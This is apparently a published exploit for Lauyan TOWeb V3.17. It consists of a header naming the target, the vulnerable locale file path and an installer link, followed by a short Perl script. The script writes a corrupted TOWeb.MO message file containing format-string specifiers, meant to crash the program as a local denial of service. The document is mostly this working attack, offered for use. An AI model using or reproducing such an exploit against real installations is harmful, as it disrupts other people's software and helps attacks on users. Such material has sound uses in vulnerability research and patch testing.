#
#Exploit Title:
#TOWeb V3 Local Format String DOS Exploit (TOWeb.MO file corruption)
#
#Date: 05/09/2011
#
#Author: BSOD Digital (Fabien DROMAS)
#Mail: bsoddigital@gmail.com
#
#
#Test:
#OS: Windows 7
#Versions: V3.17
#
#Path:
#Lauyan\TOWeb V3\locale\fr\LC_MESSAGES\TOWeb.MO
#
#Link:
#http://www.lauyan.com/download/old/install-towebv3-fr.exe
#
#!/usr/bin/perl

print "\n------------------------------------";
print "\nLauyan TOWeb v3 Local Format String Dos Exploit";
print "\nBSOD Digital - bsoddigital@gmail.com";
print "\n------------------------------------";
my $file = "TOWeb.MO";
my $corrupt = "%s" x 2;
open($File, ">$file");
print $File $corrupt;
print "\nEvil TOWeb.MO file created.";
close($File);